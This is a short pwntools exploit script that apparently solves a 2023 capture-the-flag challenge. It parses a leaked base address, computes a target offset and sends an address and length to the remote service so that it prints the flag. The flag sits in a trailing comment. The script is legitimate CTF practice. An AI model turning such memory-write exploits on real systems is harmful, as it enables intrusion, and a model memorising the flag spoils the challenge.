#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("wfw1.2023.ctfcompetition.com", 1337)
	else:
		r = process([exe.path])
	return r



# ulimit -n 1400

def main():
	r = conn()

	r.recvuntil(b'have a shot.\n')

	base_addr = int(r.recvline().split(b'-')[0].decode(), 16)
	string_to_overwrite_offset = 0x00000000000021E0

	address = base_addr + string_to_overwrite_offset
	length = 40

	success(f'{hex(base_addr)=}')
	success(f'{hex(address)=}')

	line = f'{hex(address)} {length}'
	success(line)
	r.recvuntil(b'happily expire\n')	
	r.sendline(line.encode())

	flag = r.recvline()
	success(flag.decode())

	r.close()


if __name__ == "__main__":
	main()

# CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}
